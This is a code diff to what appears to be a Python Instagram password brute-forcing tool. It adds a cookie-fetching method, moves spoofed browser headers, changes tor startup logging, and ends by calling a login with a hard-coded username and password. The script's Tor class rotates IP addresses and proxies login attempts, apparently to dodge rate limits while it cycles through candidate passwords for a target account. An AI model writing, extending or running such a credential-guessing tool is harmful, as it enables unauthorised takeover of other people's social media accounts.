@@ -16,7 +16,7 @@ class Tor():
         self.hport = hport
         self.timeout = timeout
         if which("tor") == None:
-            return 0
+            raise OverflowError("No tor Found")
 
     def change_ip(self):
         with Controller.from_port(port=self.cport) as c:
@@ -26,10 +26,11 @@ class Tor():
     def start(self):
         self.stop()
         self.mktemp_config()
-        os.system("{} -f torrc > /tmp/stdout &".format(which("tor")))
+        os.system("touch .stdout")
+        os.system("{} -f torrc > .stdout &".format(which("tor")))
         start_time = default_timer()
         while True:
-            with open("/tmp/stdout","r") as file:
+            with open(".stdout","r") as file:
                 lines = file.read().split("\n")
                 if len(lines) > 3 and "Bootstrapped 100%" in lines[-2]:
                         return "Started"
@@ -61,6 +62,22 @@ class Instagram():
         self.use_tor = use_tor
         self.username = username
         self.session = requests.session()
+        self.head_pre = {
+            "Host": "i.instagram.com",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Access-Control-Request-Method":"POST",
+            "Access-Control-Request-Headers": "x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax",
+            "Referer": "https://www.instagram.com/",
+            "Origin": "https://www.instagram.com",
+            "Connection": "keep-alive",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-site",
+            "TE": "trailers"
+            }
         try:
             line = self.session.get("https://instagram.com/"+username).text.split("\n")[13]
             if self.username not in line:
@@ -82,6 +99,20 @@ class Instagram():
         else:
             return passwords
 
+    def get_cookies(self,data,url):
+        self.session.post(url,data = data,headers=self.head_pre) 
+        cookies = self.session.cookies.get_dict()
+        if "csrftoken" in cookies.keys():
+            with open(".cookie","w") as file:
+                file.write(str(cookies).replace("'",'"'))
+                file.close
+            return cookies
+        else:
+            with open(".cookie","r") as file:
+                cookies = json.load(file)
+                file.close()
+            return cookies
+                
     def login(self,password) -> bool:
         if self.use_tor is not None:
             self.session.proxies = self.use_tor.proxy()
@@ -92,39 +123,8 @@ class Instagram():
             'queryParams': '{}',
             'optIntoOneTap': 'false'
         }
-        head_pre = {
-            "Host": "i.instagram.com",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Access-Control-Request-Method":"POST",
-            "Access-Control-Request-Headers": "x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax",
-            "Referer": "https://www.instagram.com/",
-            "Origin": "https://www.instagram.com",
-            "Connection": "keep-alive",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-site",
-            "TE": "trailers"
-        }
         self.session.cookies.clear()
-
-        def get_cookies(*args):
-            self.session.post(url,data = data,headers=head_pre) 
-            cookies = self.session.cookies.get_dict()
-            if "csrftoken" in cookies.keys():
-                with open(".cookie","w") as file:
-                    file.write(str(cookies).replace("'",'"'))
-                    file.close
-                return cookies
-            else:
-                with open(".cookie","r") as file:
-                    cookies = json.load(file)
-                    file.close()
-                return cookies
-                
-        response_cookies = get_cookies()
+        response_cookies = self.get_cookies(data,url)
         head_post = {
             "Host": "i.instagram.com",
             "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
@@ -148,7 +148,7 @@ class Instagram():
         return False
 
 tor = Tor(9876,4949)
-tor.start()
-ig = Instagram("tdynamos.linux",use_tor=tor)
+#tor.start()
+ig = Instagram("tdynamos.linux",use_tor=None)
 print(ig.name)
 ig.login("ansh1234")
